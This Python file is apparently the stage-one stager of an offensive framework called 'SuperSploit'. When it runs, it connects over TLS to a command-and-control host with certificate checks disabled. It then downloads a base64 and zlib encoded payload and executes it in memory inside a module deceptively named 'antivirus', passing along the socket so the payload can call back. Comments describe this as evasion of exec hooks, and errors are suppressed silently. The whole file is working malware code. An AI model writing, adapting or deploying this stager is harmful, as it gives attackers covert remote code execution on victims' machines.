import types
import ssl
import base64
import zlib
from socket import socket, AF_INET, SOCK_STREAM


# --- FRAMEWORK TEMPLATE VARIABLES ---
# SuperSploit will dynamically overwrite these values during payload generation.
C2_HOST = "127.0.0.1"
C2_PORT = 5000

class Start:
    
    def __init__(self):
        # Only attempt to receive and execute if the connection succeeds
        if self.connect(C2_HOST, C2_PORT):
            encoded_payload = self.recv_all()
            if encoded_payload:
                try:
                    # OPSEC: Decode the payload in-memory just before execution
                    self.exc(base64.b64decode(encoded_payload))
                except Exception:
                    pass
                
        # Clean up the file descriptor silently
        try:
            self.s.close()
        except AttributeError:
            pass
    
    def connect(self, host, port):
        try:
            raw_socket = socket(AF_INET, SOCK_STREAM)
            
            # Create an SSL context that ignores self-signed certificate validation
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Wrap the socket to establish the TLS handshake
            self.s = context.wrap_socket(raw_socket, server_hostname=host)
            self.s.connect((host, port))
            return True
        except Exception:
            return False
        
    def recv_all(self):
        try:
            # 1. Read the first 4 bytes to determine the total payload length
            raw_length = self._recv_exact(4)
            if not raw_length:
                return None
            
            payload_length = int.from_bytes(raw_length, 'big')
            
            # 2. Read exactly the expected number of bytes to reconstruct the fragmented stream
            return self._recv_exact(payload_length)
        except OSError:
            return None
            
    def _recv_exact(self, n):
        # Helper function to reliably read exactly n bytes, handling TCP fragmentation
        data = bytearray()
        while len(data) < n:
            packet = self.s.recv(n - len(data))
            if not packet:
                return None
            data.extend(packet)
        return bytes(data)
    
    def exc(self, payload):
        name_space = "antivirus"
        virtual_module = types.ModuleType(name_space)
        
        # Inject the active network socket into the module's global namespace
        # so the Stage 2 payload can communicate back to SuperSploit.
        virtual_module.__dict__['client_socket'] = self.s
        
        try:
            # OPSEC: Decompress and dynamically compile on the TARGET device.
            # This guarantees bytecode compatibility across all Python versions (fixing marshal fragility).
            # Passing a code object to exec() still evades basic string-based eval/exec hooks,
            # while avoiding cross-version crashes.
            try:
                decompressed = zlib.decompress(payload)
                code_obj = compile(decompressed, '<string>', 'exec')
                exec(code_obj, virtual_module.__dict__)
            except zlib.error:
                # Fallback if the payload was sent cleartext (but base64 encoded) instead of zlib compressed
                code_obj = compile(payload, '<string>', 'exec')
                exec(code_obj, virtual_module.__dict__)
        except Exception:
            # In a stager, we silently fail to avoid dropping loud stack traces
            pass
            
# Initialize and execute the stager automatically
Start()